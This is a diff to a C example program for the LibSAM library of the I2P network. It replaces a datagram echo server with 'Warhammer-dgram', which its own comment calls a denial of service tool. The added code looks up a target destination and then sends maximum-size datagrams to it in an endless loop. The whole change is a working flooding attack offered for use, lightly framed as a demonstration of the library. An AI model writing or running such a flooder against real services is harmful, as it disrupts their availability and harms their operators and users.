@@ -28,11 +28,17 @@
  * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-#include <assert.h>
+/*
+ * Warhammer-dgram: a simple denial of service tool which uses datagrams, and
+ * illustrates how LibSAM works.
+ * Use only with the utmost courtesy.
+ */
+
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include "sam.h"
 
 static void dgramback(sam_pubkey_t dest, void *data, size_t size);
@@ -40,69 +46,78 @@ static void diedback(void);
 static void logback(char *s);
 static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result);
 
-/*
- * This is an extremely simple echo server which shows you how LibSAM
- * datagrams work.  We echo back every datagram that is sent to us.
- */
+bool gotdest = false;
+sam_pubkey_t dest;
+
 int main(int argc, char* argv[])
 {
-	samerr_t rc;
+	if (argc != 2) {
+		fprintf(stderr, "Syntax: %s <b64dest|name>\n", argv[0]);
+		return 1;
+	}
 
-	/* Hook up the callback functions */
 	sam_dgramback = &dgramback;
 	sam_diedback = &diedback;
 	sam_logback = &logback;
 	sam_namingback = &namingback;
 
-	/* Connect to the SAM server -- you can use either an IP or DNS name */
-	rc = sam_connect("127.0.0.1", 7656, "dgram-server", SAM_DGRAM, 0);
+	/* a tunnel length of 2 is the default - adjust to your preference   vv */
+	samerr_t rc = sam_connect("localhost", 7656, "TRANSIENT", SAM_DGRAM, 2);
 	if (rc != SAM_OK) {
 		fprintf(stderr, "SAM connection failed: %s\n", sam_strerror(rc));
 		exit(1);
 	}
 
-	/*
-	 * At this point we just keep polling the buffer, which causes the
-	 * appropriate callbacks to be called whenever something happens
-	 */
-	while (true)
+	if (strlen(argv[1]) == 516) {
+		memcpy(dest, argv[1], SAM_PUBKEY_LEN);
+		gotdest = true;
+	}
+	else
+		sam_naming_lookup(argv[1]);
+
+	while (!gotdest)
 		sam_read_buffer();
+
+	char data[SAM_DGRAM_PAYLOAD_MAX];
+	memset(data, '#', SAM_DGRAM_PAYLOAD_MAX);
+	size_t sentbytes = 0;
+	while (true) {
+		rc = sam_dgram_send(dest, data, SAM_DGRAM_PAYLOAD_MAX);
+		if (rc != SAM_OK) {
+			fprintf(stderr, "sam_dgram_send() failed: %s\n", sam_strerror(rc));
+			return 1;
+		}
+		sentbytes += SAM_DGRAM_PAYLOAD_MAX;
+		printf("Bombs away! (%u kbytes sent so far)\n", sentbytes / 1024);
+		sam_read_buffer();
+	}
 
 	return 0;
 }
 
-/*
- * When we receive some data, we just ECHO the exact same data back to them
- */
 static void dgramback(sam_pubkey_t dest, void *data, size_t size)
 {
-	puts("Echoing datagram");
-	sam_dgram_send(dest, data, size);
+	puts("Received a datagram (ignored)");
 	free(data);
 }
 
-/*
- * This is called whenever the SAM connection fails (like if the I2P router is
- * shut down)
- */
 static void diedback(void)
 {
 	fprintf(stderr, "Lost SAM connection!\n");
 	exit(1);
 }
 
-/*
- * The logging callback prints any logging messages from LibSAM
- */
 static void logback(char *s)
 {
 	fprintf(stderr, "LibSAM: %s\n", s);
 }
 
-/*
- * Not used, but the function has to be in the program anyway
- */
 static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result)
 {
-	assert(false);  /* we don't do any naming lookups in this program */
+	if (result != SAM_OK) {
+		fprintf(stderr, "Naming lookup failed: %s\n", sam_strerror(result));
+		exit(1);
+	}
+	memcpy(dest, pubkey, SAM_PUBKEY_LEN);
+	gotdest = true;
 }
